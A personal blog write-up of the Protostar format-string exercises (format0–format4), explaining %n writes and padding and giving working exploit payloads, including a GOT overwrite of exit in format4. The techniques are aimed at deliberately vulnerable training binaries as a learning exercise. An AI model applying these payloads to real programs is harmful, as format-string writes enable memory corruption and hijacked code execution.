---
layout: post
title:  "Protostar Exploit Exercises: Formatting challenges"
---

Coming from the stack-overflow challenges, I was feeling happy about
being able to work my way into the format challenges, but my happiness was
short-lived; *I do not understand how the format-exploits really work.*

To aid my ignorance, and with dreams of exploiting binaries; I set out on
a quest of format exploitation, with the help of
[this](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)
wonderful paper and the Protostar virtual machine by my side.

## [format0](https://exploit-exercises.com/protostar/format0)

* * * 

>### About
>
>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
>
>Hints
>
> + This level should be done in less than 10 bytes of input.
>
> + “Exploiting format string vulnerabilities”

As always with these challenges, some code is supplied.

{% highlight c %}

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

{% endhighlight %}

`target` is allocated at 0xbffff73c, `buffer` is located at a lower
address, which means that as buffer is filled with characters, it
could overflow into target. The restriction stated in the challenge
description limits our input to the program to less than 10 bytes - So
no more standard buffer overflows for us :(

## 8 = 68

`sprintf` reads parameters of the stack, based on the format-string it's
given. For example, a format-string of `%s` expects that there's a address
of a string, to print into the destination buffer.

`%64d` makes sprintf align the output to 64 characters.

By extension, my solution is a buffer overflow.

~~~
$ ./format0 `python -c "print('%64d\xef\xbe\xad\xde')`
you have hit the target correctly :)
~~~

:TODO: The solution above is a buffer overflow, look into 
solving the challenge without using a buffer overflow

## [format1](https://exploit-exercises.com/protostar/format1)

* * *

>###About
>
>This level shows how format strings can be used to modify arbitrary memory locations.
>
>Hints
>
> `objdump -t` is your friend, and your input string lies far up the stack :)

If you're not familiar with format-string exploits, then yep; You read
that right. Format-string exploits can be used to modify arbitrary
memory locations.

Take the `%n` formatter for example, the manual describes it as
follows:

>The number of characters written so far is stored into the integer
>indicated by the int * (or variant) pointer argument. No argument is
>converted

If you're bewildered by what the manual told you, the following piece of
pseudo-c illustrates it's functionality.

{% highlight c %}
int x;
char y[32];
sprintf(y, "123456789%n", &x);
printf("%d", x); // prints 9
{% endhighlight %}

Hopefully that makes it clear what the `%n` formatters functionality
is, let's continue with the actual challenge.

{% highlight c %}
int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}
{% endhighlight %}

### Crashing the process.

Using the previously mentioned formatter `%n`, it's simple enough to 
crash the application. By providing the string `%08x%08x%n`, we write
the value 16 into some dereferenced pointer on the stack.

~~~
$ ./format1 %08x%08x%n
Segmentation fault
~~~

### Changing target

To change target, we need to find out where it's located.

~~~
$ objdump -t format1 | grep target
 g	0 .bss	00000004		target
~~~

At this point I put a break-point just before the call to `printf` in
the `vuln`-function & examined the stack-pointer. The `string` variable is located
at `0xbffff979` and esp is pointing towards `0xbffff750`. 

The `%n` formatter writes the amount of bytes written so far, to a
dereferenced pointer located on the stack; And for each formatter we
use, the formatting function expects another value to be stored on the
stack.

![Formatting stuff part one]({{ site-url }}/assets/post_images/formatters_step_one.png)

*Replacing the first `%08x`, the stack is examined 4 bytes at a time,
 it's values are formatted into the string.*

![Formatting stuff part two]({{ site-url }}/assets/post_images/formatters_step_two.png)

*The following `%08x` loads the next 4 bytes on the stack into the into the string.* 

And so on.

If we give a large amount of formatting-strings, we can advance the
formatting pointer so far that it ends up pointing at our `string`
variable. If we line things up perfectly, the formatting function
will reach our `%n` when it's value on the formatters pointer points
to `target`.

And that's how I understand it, *theoretically* we can modify the
`target` variable using this technique.

The distance we need to pop before the formatters stack-pointer is pointing towards `string` turns out to be 550 bytes. 

550 is based on my observation that the offset in-between the
stack-pointer (before the call to printf) and the address to `string`
was 550 bytes.

### while (patience != 0) { print("BZZZ!!! WRONG!!") }

I had banged my head against the wall a fair bit before doing so.

I got stuck and looked up a solution for this level.  I was around 10
bytes off & couldn't figure out why I was failing before I gave up.

My last command before submitting to fatigue:

~~~
(gdb) start `python -c "print('\x38\x96\x04\x08___'+'%08x_'*142+'%n')"`
~~~

Which is still not really a solution so much as a ineffective way of
doing things; Instead of carpet-bombing argv with `'%08x'*142`,
`%142$n` would've worked equally bad - but somewhat more elegantly.

Either way, here's the solution:

~~~
$ ./format1 `python -c 'print "\x38\x96\x04\x08___%130\$n"'`
8___you have modified the target :)
~~~

Those of you playing along at home, those three underscores are simply
used for alignment.

So there you have it; challenge is solved & I'm somewhat wiser as to
how these format exploits work. This challenge beat me up pretty bad,
but I learned some useful and hopefully I'll be able to solve the format2.

#### Shout-outs
* [@_iphelix](https://twitter.com/_iphelix) for his [great write-up](https://thesprawl.org/research/exploit-exercises-protostar-format/#format-1) on this challenge.

## [format2](https://exploit-exercises.com/protostar/format2)

* * * 

>###About
>
>This level moves on from format1 and shows how specific values can be written in memory.

You guessed it, here's some code that's provided along with the description.

{% highlight c %}
void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}
{% endhighlight %}

Last challenge, we modified `target` to *some* value... This time we
need to be more specific.

Spontaneously I felt like this challenge was going to have a less
steep learning curve, We already got around to changing `target`, how
hard could it be to change it to something specific?

Upon inspection, the formatting-strings pointer can be found via the
eax-register or on top of the stack before the call to printf.

{% highlight nasm %}
lea eax, [ebp-0x208]
mov DWORD PTR [esp], eax
call printf
{% endhighlight %}

I looked at the difference between eax and esp before the call to
printf and took note of the difference. The difference was 0x10.

This *felt* weird, but I gave no fucks about my intuitions & trusted
that the computer had honest intentions in placing these pointers so
close to each-other.

We need to modify the target to 64. Once again we will use `%n` to
achieve our goal. Much like before we lead our payload with the address
of the variable we want to modify.

Formatting data sometimes requires padding, that's why the formatting
functions allow for specifying padding via `%nF` (where `n`=padding
amount & `F`=formatting).

We can use this to increase the value written via `%n` (which - as you
might remember, writes the amount of bytes written so far into a
dereferenced pointer)

### Solution

~~~
$ python -c 'print "\xe4\x96\x04\x08___%57d%4$n"' | ./format2
___                                                         512
you have modified the target :)
~~~

![0xdecafbad]({{ site-url }}/assets/post_images/protostar_format_format2_success.png)

*Pictured: Author exploiting a format-vulnerability in a binary*

## [format3](https://exploit-exercises.com/protostar/format3)

* * *

>###About
>
>This level advances from format2 and shows how to write more
>than 1 or 2 bytes of memory to the process. This also teaches you to
>carefully control what data is being written to the process memory.

{% highlight c %}
int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}
{% endhighlight %}

`target`s location in memory stretches from `0x80496f4`, all the way to `0x80496f7`.

We need to overwrite the least significant bits first, since each `%n`
formatter will write 4 bytes to a given pointer. The paper [Exploiting
Format String Vulnerabilities](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf) (section 3.4.2) explains the reason better than I could.

I was able to craft a payload, which basically has three parts

* Write 68/0x44 to `0x080496f4`

* Write 85/0x55 to `0x080496f5`

* Write 258/0x102 to `0x080496f6`

~~~	
$ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08' + '%56d%12\$n' + '%17d%13\$n' + '%173d%14\$n'" > /tmp/f3input
$ ./format3 < /tmp/f3input
...
you have modified the target :)
~~~

The addresses listed in the steps above are located at the beginning
of the format string, and are accessed via `12$n`, `13$n` & `14$n`
respectively.

By the time that the first formatter is handled by printf, 12 bytes
has already been written, to reach 0x44, a padding of 56 is used.

Next up, another 17 bytes are padded to reach 85. And finally, we throw
some more padding in there and write the final word of memory to `target`;
as we rejoice & cheer that we're getting the hang of format-exploits.

![0xdecafbae]({{ site-url }}/assets/post_images/protostar_format_format3.gif)

## [format4](https://exploit-exercises.com/protostar/format4)

* * * 

>###About
>
>%p format4 looks at one method of redirecting execution in a process.
>
>Hints
>
>* objdump -TR is your friend

In ELF-executables, there's this table of externally located functions
called Global offset table (GOT) which is useful for using shared libraries.

A call to a external function goes through GOT, and it's address is
resolved at run-time.

The exact location we need to modify (`exit`s listing in GOT), can
be viewed by running `objdump -TR` as stated in the hint.

~~~
$ objdump -TR /opt/protostar/bin/format4
DYNAMIC RELOCATION RECORDS
08049724 R_386_JUMP_SLOT   exit
~~~

And the relevant address we want to overwrite via the our exploit is
also fetched via objdump.

~~~
$ objdump -t /opt/protostar/bin/format4 | grep hello
080484b4 g     F .text	0000001e              hello
~~~

Putting two and two together, I whipped up a quick python-script
which generates a payload.

{% highlight python %}
# format4_payload.py
PAYLOAD='\x24\x97\x04\x08' +\
	'\x25\x97\x04\x08' +\
	'\x26\x97\x04\x08' +\
	'\x27\x97\x04\x08' +\
	'%%%su' % str(0xb4-16) + '%4$n' +\
	'%%%su' % str(0x184-0xb4) + '%5$n' +\
	'%%%su' % str(0x204-0x184) + '%6$n' +\
	'____' + '%7$n'
print PAYLOAD
{% endhighlight %}

And, of-course - running the executable with our payload, overwrites
the GOT-entry for `exit` and execution is instead passed into the hello function.

~~~
$ python format4_payload.py > ./f4in
$ /opt/protostar/bin/format4 < ./f4in
                                                                                                                                                                 512                                                                                                                                                                                                      3086844960                                                                                                                      3221224244____
code execution redirected! you win
~~~

![yay]({{ site-url }}/assets/post_images/protostar_format_4_success.jpe)

* * * 

Now, coming to an end of this post - I think my understanding of
format-exploits are greatly improved. And it's a neat form of
exploitation, Now I'm heading into the heap-challenges.

Thanks for bearing with me.

